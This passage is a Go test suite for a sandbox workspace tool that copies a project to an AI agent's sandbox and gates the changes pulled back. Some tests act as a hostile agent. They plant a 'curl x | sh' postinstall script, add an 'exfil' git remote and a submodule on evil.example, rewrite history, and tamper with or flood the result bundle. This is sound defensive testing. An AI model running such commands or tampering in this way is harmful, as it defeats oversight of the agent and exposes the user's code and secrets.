// Copyright 2026 Cisco Systems, Inc. and its affiliates
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

package workspace

import (
	"bytes"
	"context"
	"encoding/base64"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

const remoteRepo = "/sandbox/work/myapp"

// launchCopy stages, uploads and baselines e.project into a fake sandbox.
func launchCopy(t *testing.T, e *env, name string, mutate func(*StageOptions)) (*CopyRecord, *fakeSandbox) {
	t.Helper()
	fs := newFakeSandbox(t, e)
	opts := StageOptions{Project: e.project, Name: name, DataDir: e.data, Home: e.home}
	if mutate != nil {
		mutate(&opts)
	}
	if _, err := Stage(bg, opts); err != nil {
		t.Fatal(err)
	}
	if _, err := Upload(bg, e.data, name, fs); err != nil {
		t.Fatal(err)
	}
	rec, err := EstablishBaseline(bg, e.data, name, fs)
	if err != nil {
		t.Fatal(err)
	}
	return rec, fs
}

func pull(t *testing.T, e *env, fs *fakeSandbox, name string) *PullResult {
	t.Helper()
	pr, err := Pull(bg, PullOptions{DataDir: e.data, Name: name, Exec: fs, Scanners: []ContentScanner{SecretsScanner()}})
	if err != nil {
		t.Fatal(err)
	}
	return pr
}

func apply(e *env, name string, mode ApplyMode, mutate func(*ApplyOptions)) (*ApplyResult, error) {
	opts := ApplyOptions{DataDir: e.data, Name: name, Mode: mode}
	if mutate != nil {
		mutate(&opts)
	}
	return Apply(bg, opts)
}

func TestStageGitProjectIsSanitized(t *testing.T) {
	e := newEnv(t)
	e.initRepo()
	for i := 0; i < 5; i++ {
		writeFile(t, e.project, "history.txt", strings.Repeat("x", i+1))
		e.git(e.project, "add", "-A")
		e.git(e.project, "commit", "-q", "-m", "c")
	}
	e.git(e.project, "remote", "add", "origin", "https://alice:ghp_secret@github.com/acme/myapp.git")
	e.git(e.project, "remote", "add", "mirror", "git@github.com:acme/myapp.git")
	e.git(e.project, "remote", "add", "local", filepath.Join(e.home, "upstream.git"))
	writeFile(t, e.project, ".git/hooks/pre-commit", "#!/bin/sh\nexit 1\n")
	writeFile(t, e.project, "config/server.key", "tracked secret\n")
	e.git(e.project, "add", "-f", "config/server.key")
	e.git(e.project, "commit", "-q", "-m", "key")
	writeFile(t, e.project, "certs/dev.pem", "untracked secret\n")
	writeFile(t, e.project, "wip.txt", "uncommitted\n")
	writeFile(t, e.project, "README.md", "hello, modified\n")
	writeFile(t, e.project, "debug.log", "ignored\n")
	writeFile(t, e.project, "node_modules/x/i.js", "untracked cache\n")

	rec, err := Stage(bg, StageOptions{Project: e.project, Name: "c1", DataDir: e.data, Home: e.home, GitDepth: 3})
	if err != nil {
		t.Fatal(err)
	}
	if rec.Kind != CopyGit || rec.RemoteDir != remoteRepo || rec.RemoteGitDir != remoteRepo+"/.git" {
		t.Fatalf("record: %+v", rec)
	}
	if rec.Remotes["origin"] != "https://github.com/acme/myapp.git" || rec.Remotes["mirror"] != "git@github.com:acme/myapp.git" {
		t.Fatalf("remotes = %v", rec.Remotes)
	}
	if _, ok := rec.Remotes["local"]; ok {
		t.Fatal("local-path remote must not be copied")
	}
	if strings.Join(rec.HeldBack, ",") != "certs/dev.pem,config/server.key" {
		t.Fatalf("held back = %v", rec.HeldBack)
	}
	stage := rec.Stage
	sg := func(args ...string) string { return runGit(t, e.home, stage, args...) }
	if n := sg("rev-list", "--count", "HEAD"); n != "3" {
		t.Fatalf("history depth = %s, want 3", n)
	}
	if strings.Contains(readFile(t, stage, ".git/config"), "ghp_secret") {
		t.Fatal("credentials leaked into the staged config")
	}
	if entries, _ := os.ReadDir(filepath.Join(stage, ".git", "hooks")); len(entries) != 0 {
		t.Fatalf("staged repo has hooks: %v", entries)
	}
	for _, missing := range []string{"certs/dev.pem", "config/server.key", "debug.log", "node_modules"} {
		if pathExists(filepath.Join(stage, missing)) {
			t.Fatalf("%s must not be staged", missing)
		}
	}
	if readFile(t, stage, "wip.txt") != "uncommitted\n" || readFile(t, stage, "README.md") != "hello, modified\n" {
		t.Fatal("working tree overlay missing")
	}
	status := sg("status", "--porcelain")
	if strings.Contains(status, "server.key") || !strings.Contains(status, "M README.md") || !strings.Contains(status, "?? wip.txt") {
		t.Fatalf("staged status = %q (held-back tracked files must not show as deleted)", status)
	}
	if sg("rev-parse", "refs/defenseclaw/baseline^") != e.git(e.project, "rev-parse", "HEAD") {
		t.Fatal("baseline must sit on the project's HEAD")
	}
	if got := sg("show", "refs/defenseclaw/baseline:wip.txt"); got != "uncommitted" {
		t.Fatalf("baseline misses the working tree: %q", got)
	}
}

func TestStageSizePreflight(t *testing.T) {
	e := newEnv(t)
	e.initRepo()
	writeFile(t, e.project, "big.bin", strings.Repeat("b", 64<<10))
	_, err := Stage(bg, StageOptions{Project: e.project, Name: "c1", DataDir: e.data, Home: e.home, MaxBytes: 16 << 10})
	if !errors.Is(err, ErrTooLarge) {
		t.Fatalf("err = %v, want ErrTooLarge", err)
	}
	if pathExists(filepath.Join(e.data, "sandboxes", "c1", "copy")) {
		t.Fatal("failed stage left files behind")
	}
	if _, err := Stage(bg, StageOptions{Project: e.home, Name: "c2", DataDir: e.data, Home: e.home}); !errors.Is(err, ErrUnsafeSource) {
		t.Fatalf("home: %v", err)
	}
}

func TestStagePlainFolderEntryLimit(t *testing.T) {
	e := newEnv(t)
	for _, rel := range []string{"a.txt", "d/b.txt", "d/c.txt", "e.txt"} {
		writeFile(t, e.project, rel, rel+"\n")
	}
	// Five entries: a walk that stops at four must not stage part of the
	// folder as if it were all of it.
	opts := StageOptions{Project: e.project, Name: "p1", DataDir: e.data, Home: e.home, MaxWalkEntries: 4}
	_, err := Stage(bg, opts)
	var tl *TooLargeError
	if !errors.As(err, &tl) || !errors.Is(err, ErrTooLarge) || !tl.Entries || tl.Limit != 4 {
		t.Fatalf("err = %v", err)
	}
	if _, err := LoadCopy(e.data, "p1"); !errors.Is(err, ErrCopyNotFound) {
		t.Fatalf("refused stage left a record: %v", err)
	}
	opts.MaxWalkEntries = 5
	rec, err := Stage(bg, opts)
	if err != nil {
		t.Fatal(err)
	}
	if rec.Kind != CopyPlain || rec.Files != 4 {
		t.Fatalf("record: kind %s, %d files", rec.Kind, rec.Files)
	}
}

func TestCopyRoundTripApplyMerge(t *testing.T) {
	e := newEnv(t)
	e.initRepo()
	writeFile(t, e.project, "wip.txt", "operator wip\n")
	rec, fs := launchCopy(t, e, "c1", nil)
	if strings.Join(fs.uploads, "|") == "" || !pathExists(fs.local(remoteRepo+"/.git")) {
		t.Fatalf("uploads = %v", fs.uploads)
	}
	if rec.Stage != "" || !pathExists(rec.BaseGit) {
		t.Fatalf("after upload: stage=%q base=%q", rec.Stage, rec.BaseGit)
	}

	// The agent commits one change and leaves another uncommitted.
	fs.write(remoteRepo+"/src/app.go", "package main\n\nfunc main() {}\n")
	fs.agent(remoteRepo, "add", "src/app.go")
	fs.agent(remoteRepo, "commit", "-q", "-m", "agent: main")
	fs.write(remoteRepo+"/docs/notes.md", "notes\n")

	// Meanwhile the operator edits another file on the host.
	writeFile(t, e.project, "README.md", "hello from the host\n")

	pr := pull(t, e, fs, "c1")
	if len(pr.Blocking) != 0 || pr.Empty() {
		t.Fatalf("pull: blocking=%v changes=%v", pr.Blocking, pr.Changes)
	}
	if got := changePaths(pr.Changes); got != "A:docs/notes.md M:src/app.go" {
		t.Fatalf("changes = %s", got)
	}
	// The bundle arrives over exec, where the host counts every byte; the
	// CLI's download (which unpacks an archive the agent made) is unused.
	if len(fs.downloads) != 0 {
		t.Fatalf("downloads = %v", fs.downloads)
	}
	res, err := apply(e, "c1", ApplyMerge, nil)
	if err != nil {
		t.Fatal(err)
	}
	if !res.Applied || len(res.Conflicts) != 0 {
		t.Fatalf("apply: %+v", res)
	}
	if readFile(t, e.project, "src/app.go") != "package main\n\nfunc main() {}\n" || readFile(t, e.project, "docs/notes.md") != "notes\n" {
		t.Fatal("agent changes not applied")
	}
	if readFile(t, e.project, "README.md") != "hello from the host\n" || readFile(t, e.project, "wip.txt") != "operator wip\n" {
		t.Fatal("operator's own changes were lost")
	}
	if cached := e.git(e.project, "diff", "--cached", "--name-only"); cached != "" {
		t.Fatalf("apply touched the index: %q", cached)
	}
	if e.git(e.project, "rev-parse", "--verify", res.PreApplyRef+":README.md") == "" {
		t.Fatal("pre-apply state not kept")
	}
	if strings.Contains(e.git(e.project, "for-each-ref", "refs/defenseclaw/copy/c1/result"), "result") {
		t.Fatal("temporary import refs left behind")
	}
}

func TestCopyKeepsLineEndingSettingsConsistent(t *testing.T) {
	e := newEnv(t)
	e.git(e.project, "init", "-q", "-b", "main")
	e.git(e.project, "config", "core.autocrlf", "true")
	writeFile(t, e.project, "a.txt", "one\r\ntwo\r\n")
	writeFile(t, e.project, "b.txt", "three\r\n")
	e.git(e.project, "add", "-A")
	e.git(e.project, "commit", "-q", "-m", "crlf")
	rec, fs := launchCopy(t, e, "c1", nil)
	if rec.LineEndings["core.autocrlf"] != "true" {
		t.Fatalf("line endings not recorded: %v", rec.LineEndings)
	}
	if st := fs.agent(remoteRepo, "status", "--porcelain"); st != "" {
		t.Fatalf("copy shows spurious changes: %q", st)
	}
	fs.write(remoteRepo+"/a.txt", "one\r\ntwo\r\nfour\r\n")
	pr := pull(t, e, fs, "c1")
	if got := changePaths(pr.Changes); got != "M:a.txt" {
		t.Fatalf("changes = %s", got)
	}
	res, err := apply(e, "c1", ApplyMerge, nil)
	if err != nil || !res.Applied || len(res.Conflicts) != 0 {
		t.Fatalf("apply: %+v %v", res, err)
	}
	if readFile(t, e.project, "a.txt") != "one\r\ntwo\r\nfour\r\n" || readFile(t, e.project, "b.txt") != "three\r\n" {
		t.Fatalf("a.txt = %q", readFile(t, e.project, "a.txt"))
	}
}

func TestCopyApplyConflictFallsBackToBranchAndPatch(t *testing.T) {
	e := newEnv(t)
	e.initRepo()
	_, fs := launchCopy(t, e, "c1", nil)
	fs.write(remoteRepo+"/README.md", "agent version\n")
	writeFile(t, e.project, "README.md", "host version\n")
	pull(t, e, fs, "c1")
	res, err := apply(e, "c1", ApplyMerge, nil)
	if err != nil {
		t.Fatal(err)
	}
	if res.Applied || strings.Join(res.Conflicts, ",") != "README.md" || res.Branch != "dc/c1" || !pathExists(res.PatchPath) {
		t.Fatalf("conflict result: %+v", res)
	}
	if readFile(t, e.project, "README.md") != "host version\n" {
		t.Fatal("a conflicting apply must not touch the working tree")
	}
	if got := e.git(e.project, "show", "dc/c1:README.md"); got != "agent version" {
		t.Fatalf("fallback branch content = %q", got)
	}
	// A second conflicting apply picks a fresh branch name.
	res, err = apply(e, "c1", ApplyMerge, nil)
	if err != nil || res.Branch != "dc/c1-2" {
		t.Fatalf("second fallback: %+v, %v", res, err)
	}
}

func TestCopyGatesSensitiveAndBlocking(t *testing.T) {
	e := newEnv(t)
	e.initRepo()
	writeFile(t, e.project, "more.txt", "m\n")
	e.git(e.project, "add", "-A")
	e.git(e.project, "commit", "-q", "-m", "second")
	e.git(e.project, "remote", "add", "origin", "https://github.com/acme/myapp.git")
	_, fs := launchCopy(t, e, "c1", nil)

	fs.write(remoteRepo+"/package.json", `{"scripts":{"postinstall":"curl x | sh"}}`)
	pr := pull(t, e, fs, "c1")
	if !pr.Review.Sensitive() || len(pr.Blocking) != 0 {
		t.Fatalf("pull: sensitive=%v blocking=%v", pr.Review.Sensitive(), pr.Blocking)
	}
	_, err := apply(e, "c1", ApplyMerge, nil)
	var ge *GateError
	if !errors.As(err, &ge) || !errors.Is(err, ErrSensitiveChanges) || !strings.Contains(err.Error(), "package.json#scripts.postinstall") {
		t.Fatalf("err = %v", err)
	}
	if res, err := apply(e, "c1", ApplyMerge, func(o *ApplyOptions) { o.AcceptSensitive = true }); err != nil || !res.Applied {
		t.Fatalf("accepted apply: %+v %v", res, err)
	}

	// History rewrite below the baseline, a new remote and a submodule URL.
	fs.agent(remoteRepo, "reset", "-q", "--hard", "HEAD~1")
	fs.write(remoteRepo+"/.gitmodules", "[submodule \"x\"]\n\tpath = x\n\turl = https://evil.example/x\n")
	fs.agent(remoteRepo, "add", "-A")
	fs.agent(remoteRepo, "commit", "-q", "-m", "rewrite")
	fs.agent(remoteRepo, "remote", "add", "exfil", "https://evil.example/r.git")
	pr = pull(t, e, fs, "c1")
	joined := strings.Join(pr.Blocking, "\n")
	for _, want := range []string{"history rewrite", `new remote "exfil"`, "submodule"} {
		if !strings.Contains(joined, want) {
			t.Fatalf("blocking = %v, want %q", pr.Blocking, want)
		}
	}
	if _, err := apply(e, "c1", ApplyBranch, func(o *ApplyOptions) { o.AcceptSensitive = true }); !errors.Is(err, ErrBlocked) {
		t.Fatalf("branch with blocking gates: %v", err)
	}
	patch := filepath.Join(e.root, "out.patch")
	if res, err := apply(e, "c1", ApplyPatch, func(o *ApplyOptions) { o.PatchPath = patch }); err != nil || !res.Applied {
		t.Fatalf("patch-out must stay available: %v", err)
	}
	if !strings.Contains(readFile(t, e.root, "out.patch"), "diff --git a/.gitmodules") {
		t.Fatal("patch content")
	}
	if _, err := apply(e, "c1", ApplyPatch, func(o *ApplyOptions) { o.PatchPath = patch }); err == nil {
		t.Fatal("existing patch file overwritten without Force")
	}
	res, err := apply(e, "c1", ApplyBranch, func(o *ApplyOptions) { o.AcceptSensitive, o.Force = true, true })
	if err != nil || res.Branch != "dc/c1" {
		t.Fatalf("forced branch: %+v %v", res, err)
	}
	if _, err := apply(e, "c1", ApplyBranch, func(o *ApplyOptions) { o.AcceptSensitive = true; o.Force = false }); err == nil {
		t.Fatal("existing branch reused without Force")
	}
}

func TestCopyDropsChangesToHeldBackSecrets(t *testing.T) {
	e := newEnv(t)
	e.initRepo()
	writeFile(t, e.project, "config/server.key", "real key\n")
	e.git(e.project, "add", "-f", "config/server.key")
	e.git(e.project, "commit", "-q", "-m", "key")
	writeFile(t, e.project, "certs/dev.pem", "untracked real cert\n")
	_, fs := launchCopy(t, e, "c1", nil)
	if pathExists(fs.local(remoteRepo + "/config/server.key")) {
		t.Fatal("held-back secret uploaded")
	}
	// The agent blindly creates files where the secrets live and removes
	// the tracked one from the index.
	fs.write(remoteRepo+"/certs/dev.pem", "agent junk\n")
	fs.agent(remoteRepo, "update-index", "--no-skip-worktree", "config/server.key")
	fs.agent(remoteRepo, "rm", "-q", "--cached", "config/server.key")
	fs.agent(remoteRepo, "commit", "-q", "-m", "drop key")
	fs.write(remoteRepo+"/ok.txt", "fine\n")

	pr := pull(t, e, fs, "c1")
	if strings.Join(pr.Dropped, ",") != "certs/dev.pem,config/server.key" {
		t.Fatalf("dropped = %v", pr.Dropped)
	}
	if got := changePaths(pr.Changes); got != "A:ok.txt" {
		t.Fatalf("effective changes = %s", got)
	}
	if _, err := apply(e, "c1", ApplyMerge, nil); err != nil {
		t.Fatal(err)
	}
	if readFile(t, e.project, "config/server.key") != "real key\n" || readFile(t, e.project, "certs/dev.pem") != "untracked real cert\n" {
		t.Fatal("held-back secrets were overwritten")
	}
	if readFile(t, e.project, "ok.txt") != "fine\n" {
		t.Fatal("other changes not applied")
	}
}

func TestCopyNoChangesAndUnbornRepo(t *testing.T) {
	e := newEnv(t)
	e.git(e.project, "init", "-q", "-b", "main")
	writeFile(t, e.project, "draft.md", "draft\n")
	rec, fs := launchCopy(t, e, "c1", nil)
	if rec.Head != "" || rec.Branch != "refs/heads/main" {
		t.Fatalf("unborn record: %+v", rec)
	}
	pr := pull(t, e, fs, "c1")
	if !pr.Empty() {
		t.Fatalf("untouched copy reported changes: %v", pr.Changes)
	}
	if _, err := apply(e, "c1", ApplyMerge, nil); !errors.Is(err, ErrNoChanges) {
		t.Fatalf("err = %v", err)
	}
	fs.write(remoteRepo+"/draft.md", "draft\nmore\n")
	fs.agent(remoteRepo, "add", "-A")
	fs.agent(remoteRepo, "commit", "-q", "-m", "first")
	pr = pull(t, e, fs, "c1")
	if len(pr.Blocking) != 0 || changePaths(pr.Changes) != "M:draft.md" {
		t.Fatalf("pull: %v %v", pr.Blocking, pr.Changes)
	}
	if res, err := apply(e, "c1", ApplyMerge, nil); err != nil || !res.Applied {
		t.Fatalf("apply: %+v %v", res, err)
	}
	if readFile(t, e.project, "draft.md") != "draft\nmore\n" {
		t.Fatal("not applied")
	}
}

func TestCopyPlainFolder(t *testing.T) {
	e := newEnv(t)
	writeFile(t, e.project, "notes.md", "a\n")
	writeFile(t, e.project, ".env", "SECRET=1\n")
	writeFile(t, e.project, "node_modules/p/i.js", "cache\n")
	writeFile(t, e.project, ".gitignore", "notes.md\n")
	rec, fs := launchCopy(t, e, "p1", nil)
	if rec.Kind != CopyPlain || rec.RemoteGitDir != "/sandbox/.dc/git" || !pathExists(fs.local("/sandbox/.dc/git/HEAD")) {
		t.Fatalf("plain record: %+v", rec)
	}
	if pathExists(fs.local(remoteRepo+"/.git")) || pathExists(fs.local(remoteRepo+"/.env")) || pathExists(fs.local(remoteRepo+"/node_modules")) {
		t.Fatal("plain copy must have no .git, no secrets and no caches")
	}
	if !pathExists(fs.local(remoteRepo + "/notes.md")) {
		t.Fatal(".gitignore must not filter a plain folder")
	}
	fs.write(remoteRepo+"/notes.md", "a\nb\n")
	fs.write(remoteRepo+"/new.txt", "n\n")
	fs.write(remoteRepo+"/node_modules/q/i.js", "installed in the sandbox\n")
	pr := pull(t, e, fs, "p1")
	if got := changePaths(pr.Changes); got != "A:new.txt M:notes.md" {
		t.Fatalf("changes = %s", got)
	}
	if _, err := apply(e, "p1", ApplyBranch, nil); !errors.Is(err, ErrNotGitProject) {
		t.Fatalf("branch on plain folder: %v", err)
	}
	res, err := apply(e, "p1", ApplyMerge, nil)
	if err != nil || !res.Applied {
		t.Fatalf("apply: %+v %v", res, err)
	}
	if readFile(t, e.project, "notes.md") != "a\nb\n" || readFile(t, e.project, "new.txt") != "n\n" || readFile(t, e.project, ".env") != "SECRET=1\n" {
		t.Fatal("plain apply wrong")
	}
	if pathExists(filepath.Join(e.project, "node_modules", "q")) {
		t.Fatal("package caches from the sandbox must not be applied")
	}
	// Conflicts in a plain folder fall back to a patch only.
	fs.write(remoteRepo+"/notes.md", "agent\n")
	writeFile(t, e.project, "notes.md", "host\n")
	pull(t, e, fs, "p1")
	res, err = apply(e, "p1", ApplyMerge, nil)
	if err != nil || res.Applied || res.Branch != "" || !pathExists(res.PatchPath) {
		t.Fatalf("plain conflict: %+v %v", res, err)
	}
}

// tamperExec lets a test act as the agent between the capture and the
// transfer of the result bundle, or replace the transfer outright (an
// agent that swaps the file after the in-sandbox check).
type tamperExec struct {
	*fakeSandbox
	afterCapture func()
	stream       func(req ExecRequest) (*ExecResult, error)
}

func (x *tamperExec) Exec(ctx context.Context, sandbox string, req ExecRequest) (*ExecResult, error) {
	if req.Stdout != nil && x.stream != nil {
		return x.stream(req)
	}
	res, err := x.fakeSandbox.Exec(ctx, sandbox, req)
	if req.Stdout == nil && err == nil && x.afterCapture != nil {
		x.afterCapture()
	}
	return res, err
}

func TestPullRejectsTamperedBundles(t *testing.T) {
	e := newEnv(t)
	e.initRepo()
	_, fs := launchCopy(t, e, "c1", nil)
	fs.write(remoteRepo+"/x.txt", "x\n")
	bundle := fs.local(remoteStateDir + "/result.bundle")
	pullDir := filepath.Join(e.data, "sandboxes", "c1", "copy", "pull")
	pullWith := func(ex Execer, limit int64) error {
		t.Helper()
		_, err := Pull(bg, PullOptions{DataDir: e.data, Name: "c1", Exec: ex, MaxBundleBytes: limit, Scanners: []ContentScanner{}})
		if pathExists(pullDir) {
			t.Fatalf("the pull left %s behind", pullDir)
		}
		return err
	}

	err := pullWith(&tamperExec{fakeSandbox: fs, afterCapture: func() { _ = os.Truncate(bundle, 20) }}, 0)
	if err == nil || !strings.Contains(err.Error(), "received a 20-byte bundle") {
		t.Fatalf("truncated bundle accepted: %v", err)
	}
	if err := pullWith(fs, 10); !errors.Is(err, ErrTooLarge) {
		t.Fatalf("oversized bundle: %v", err)
	}

	// The agent reports a small bundle, then makes it a huge sparse file,
	// a directory or a link.
	const limit = 64 << 10
	for _, tc := range []struct {
		name string
		swap func()
	}{
		{"sparse file", func() {
			writeFile(t, fs.local(remoteStateDir), "result.bundle", "marker\n")
			if err := os.Truncate(bundle, 1<<30); err != nil {
				t.Fatal(err)
			}
		}},
		{"directory", func() { writeFile(t, bundle, "inner", "marker\n") }},
		{"symlink", func() {
			writeFile(t, fs.local(remoteStateDir), "elsewhere", "marker\n")
			if err := os.Symlink("elsewhere", bundle); err != nil {
				t.Fatal(err)
			}
		}},
	} {
		err := pullWith(&tamperExec{fakeSandbox: fs, afterCapture: func() { _ = os.RemoveAll(bundle); tc.swap() }}, limit)
		if err == nil || !(strings.Contains(err.Error(), "not a regular file") || strings.Contains(err.Error(), "bundle has")) {
			t.Fatalf("%s accepted: %v", tc.name, err)
		}
		_ = os.RemoveAll(bundle)
	}

	// The in-sandbox check is only a courtesy: an agent that swaps the file
	// after it streams more than the limit, and the host stops reading.
	accepted := 0
	flood := &tamperExec{fakeSandbox: fs, stream: func(req ExecRequest) (*ExecResult, error) {
		line := []byte(strings.Repeat("bWFya2Vy", 9) + "\n") // "marker" x9, base64
		for i := 0; i < 1<<16; i++ {
			n, err := req.Stdout.Write(line)
			accepted += n
			if err != nil {
				return nil, err
			}
		}
		return &ExecResult{}, nil
	}}
	if err := pullWith(flood, limit); !errors.Is(err, ErrTooLarge) {
		t.Fatalf("flood: %v", err)
	}
	// 72 base64 characters (54 bytes) per 73-byte line.
	if accepted > (limit/54+2)*73 {
		t.Fatalf("the host accepted %d encoded bytes for a %d-byte limit", accepted, limit)
	}

	fs.failExec = errors.New("sandbox gone")
	if err := pullWith(fs, 0); err == nil {
		t.Fatal("exec failure ignored")
	}
	// Nothing above got through: a clean pull still works.
	if pr := pull(t, e, fs, "c1"); changePaths(pr.Changes) != "A:x.txt" {
		t.Fatalf("changes = %s", changePaths(pr.Changes))
	}
}

func TestBase64SinkBoundsAndValidates(t *testing.T) {
	data := []byte(strings.Repeat("marker bytes\x00\xff", 1000))
	enc := base64.StdEncoding.EncodeToString(data)
	var wrapped strings.Builder
	for i := 0; i < len(enc); i += 76 {
		wrapped.WriteString(enc[i:min(i+76, len(enc))] + "\n")
	}
	feed := func(limit int64, text string, chunk int) (*bytes.Buffer, error) {
		var out bytes.Buffer
		sink := &base64Sink{w: &out, limit: limit}
		for i := 0; i < len(text); i += chunk {
			if _, err := sink.Write([]byte(text[i:min(i+chunk, len(text))])); err != nil {
				return &out, err
			}
		}
		return &out, sink.Close()
	}
	for _, chunk := range []int{1, 3, 7, 4096} {
		out, err := feed(int64(len(data)), wrapped.String(), chunk)
		if err != nil || !bytes.Equal(out.Bytes(), data) {
			t.Fatalf("chunk %d: round trip failed: %v", chunk, err)
		}
		out, err = feed(int64(len(data))-1, wrapped.String(), chunk)
		if !errors.Is(err, errBundleLimit) || int64(out.Len()) >= int64(len(data)) {
			t.Fatalf("chunk %d: limit not enforced: %v (%d bytes written)", chunk, err, out.Len())
		}
	}
	for text, why := range map[string]string{
		"bWFy":       "",
		"bWFya2":     "truncated",
		"bWE=bWFy":   "base64|after its end",
		"bW!y":       "base64",
		"bWE=\nbWFy": "base64|after its end",
	} {
		for _, chunk := range []int{4, 1 << 10} {
			_, err := feed(1<<20, text, chunk)
			if (why == "") != (err == nil) {
				t.Errorf("%q in %d-byte writes: err = %v, want %q", text, chunk, err, why)
				continue
			}
			if err != nil {
				ok := false
				for _, w := range strings.Split(why, "|") {
					ok = ok || strings.Contains(err.Error(), w)
				}
				if !ok {
					t.Errorf("%q in %d-byte writes: err = %v, want %q", text, chunk, err, why)
				}
			}
		}
	}
}

func TestFindResumableAndRefresh(t *testing.T) {
	e := newEnv(t)
	e.initRepo()
	rec, fs := launchCopy(t, e, "c1", nil)
	key, value := ProjectLabel(e.project)
	now := time.Now()
	lister := &fakeLister{boxes: []SandboxInfo{
		{Name: "c1", Labels: rec.Labels(), Phase: "Stopped", CreatedAt: now.Add(-time.Hour)},
		{Name: "newer", Labels: map[string]string{key: value, ModeLabelKey: "mount"}, Phase: "Ready", CreatedAt: now},
		{Name: "gone", Labels: map[string]string{key: value}, Phase: "Deleting", CreatedAt: now},
		{Name: "other", Labels: map[string]string{key: "different"}, Phase: "Ready", CreatedAt: now},
	}}
	got, err := FindResumable(bg, lister, e.data, e.project)
	if err != nil {
		t.Fatal(err)
	}
	if lister.got[key] != value {
		t.Fatalf("selector = %v", lister.got)
	}
	if len(got) != 2 || got[0].Sandbox.Name != "newer" || got[1].Sandbox.Name != "c1" || got[1].Copy == nil || got[1].Mode != "copy" {
		t.Fatalf("candidates = %+v", got)
	}

	// Refresh with no sandbox changes picks up new host work.
	writeFile(t, e.project, "host.txt", "new on host\n")
	opts := RefreshOptions{Stage: StageOptions{Project: e.project, Name: "c1", DataDir: e.data, Home: e.home}, Exec: fs, Upload: fs}
	if _, err := Refresh(bg, opts); err != nil {
		t.Fatal(err)
	}
	if !pathExists(fs.local(remoteRepo + "/host.txt")) {
		t.Fatal("refresh did not upload the new state")
	}
	// Unpulled work blocks a refresh unless forced.
	fs.write(remoteRepo+"/agent.txt", "agent work\n")
	if _, err := Refresh(bg, opts); !errors.Is(err, ErrUnpulledChanges) {
		t.Fatalf("err = %v", err)
	}
	opts.Force = true
	if _, err := Refresh(bg, opts); err != nil {
		t.Fatal(err)
	}
	if pathExists(fs.local(remoteRepo + "/agent.txt")) {
		t.Fatal("forced refresh kept the old copy")
	}
}

type failUploader struct{ err error }

func (u failUploader) Upload(context.Context, string, string, string) error { return u.err }

// failingExec fails the sandbox scripts that contain marker.
type failingExec struct {
	*fakeSandbox
	marker string
}

func (f failingExec) Exec(ctx context.Context, sandbox string, req ExecRequest) (*ExecResult, error) {
	if strings.Contains(strings.Join(req.Argv, " "), f.marker) {
		return nil, errors.New("exec failed: " + f.marker)
	}
	return f.fakeSandbox.Exec(ctx, sandbox, req)
}

// copyLeftovers lists copy directories of a stage or refresh that did not
// clean up after itself.
func copyLeftovers(t *testing.T, e *env, name string) []string {
	t.Helper()
	entries, err := os.ReadDir(filepath.Join(e.data, "sandboxes", name))
	if err != nil {
		t.Fatal(err)
	}
	var out []string
	for _, en := range entries {
		if strings.HasPrefix(en.Name(), "copy.") {
			out = append(out, en.Name())
		}
	}
	return out
}

func TestFailedRefreshKeepsTheCopyState(t *testing.T) {
	e := newEnv(t)
	e.initRepo()
	before, fs := launchCopy(t, e, "c1", nil)
	fs.write(remoteRepo+"/agent.txt", "agent work\n")
	pr := pull(t, e, fs, "c1") // pulled, not applied yet
	unchanged := func(step string) {
		t.Helper()
		rec, err := LoadCopy(e.data, "c1")
		if err != nil {
			t.Fatalf("%s: %v", step, err)
		}
		if rec.Baseline != before.Baseline || rec.UploadedAt == nil || rec.BaseGit != before.BaseGit || !pathExists(rec.BaseGit) {
			t.Fatalf("%s: copy record changed: %+v", step, rec)
		}
		if got, err := LoadPull(e.data, "c1"); err != nil || got.Effective != pr.Effective {
			t.Fatalf("%s: pull lost: %v", step, err)
		}
		if left := copyLeftovers(t, e, "c1"); len(left) > 0 {
			t.Fatalf("%s: left behind %v", step, left)
		}
	}
	opts := RefreshOptions{Stage: StageOptions{Project: e.project, Name: "c1", DataDir: e.data, Home: e.home}, Exec: fs, Upload: fs, Force: true}

	// Staging fails: the project has outgrown the size limit.
	tooBig := opts
	tooBig.Stage.MaxBytes = 1
	if _, err := Refresh(bg, tooBig); !errors.Is(err, ErrTooLarge) {
		t.Fatalf("err = %v, want ErrTooLarge", err)
	}
	unchanged("stage failure")

	// Removing the old copy in the sandbox fails. The copy is still there,
	// and so is the guard for the agent's work in it.
	fs.failExec = errors.New("transient exec error")
	if _, err := Refresh(bg, opts); err == nil || !strings.Contains(err.Error(), "transient") {
		t.Fatalf("err = %v", err)
	}
	unchanged("remove failure")
	guarded := opts
	guarded.Force = false
	if _, err := Refresh(bg, guarded); !errors.Is(err, ErrUnpulledChanges) {
		t.Fatalf("guard skipped after a failed refresh: %v", err)
	}

	// The upload fails after the old copy in the sandbox was removed.
	failing := opts
	failing.Upload = failUploader{errors.New("upload interrupted")}
	if _, err := Refresh(bg, failing); err == nil || !strings.Contains(err.Error(), "interrupted") {
		t.Fatalf("err = %v", err)
	}
	unchanged("upload failure")
	if pathExists(fs.local(remoteRepo)) {
		t.Fatal("the old sandbox copy should be gone")
	}
	// The new copy arrives but its baseline cannot be set. It is taken out
	// again: no copy in the sandbox beats one the record does not describe.
	noBaseline := opts
	noBaseline.Exec = failingExec{fs, "update-ref " + baselineRef}
	uploads := len(fs.uploads)
	if _, err := Refresh(bg, noBaseline); err == nil || !strings.Contains(err.Error(), "exec failed") {
		t.Fatalf("err = %v", err)
	}
	unchanged("baseline failure")
	if len(fs.uploads) == uploads || pathExists(fs.local(remoteRepo)) {
		t.Fatalf("the unrecorded copy was left in the sandbox (uploads %v)", fs.uploads)
	}
	// The pull made before still applies.
	if res, err := apply(e, "c1", ApplyMerge, nil); err != nil || !res.Applied {
		t.Fatalf("apply after a failed refresh: %+v %v", res, err)
	}
	if readFile(t, e.project, "agent.txt") != "agent work\n" {
		t.Fatal("pulled work not applied")
	}
	// Retrying needs no force: the sandbox holds nothing to lose.
	rec, err := Refresh(bg, guarded)
	if err != nil {
		t.Fatal(err)
	}
	if rec.UploadedAt == nil || rec.VerifiedAt == nil || rec.Stage != "" || rec.BaseGit != before.BaseGit || !pathExists(rec.BaseGit) {
